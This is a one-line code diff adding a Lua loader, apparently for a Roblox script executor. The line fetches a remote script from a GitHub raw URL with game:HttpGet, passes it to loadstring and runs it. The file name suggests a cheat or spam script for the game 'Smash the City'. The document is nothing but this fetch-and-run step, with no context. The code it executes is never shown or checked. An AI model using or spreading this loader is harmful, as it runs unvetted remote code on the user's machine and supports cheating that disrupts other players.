@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/upd-smash-the-city-spam6-gefkexa9ij5mn2.lua"))()
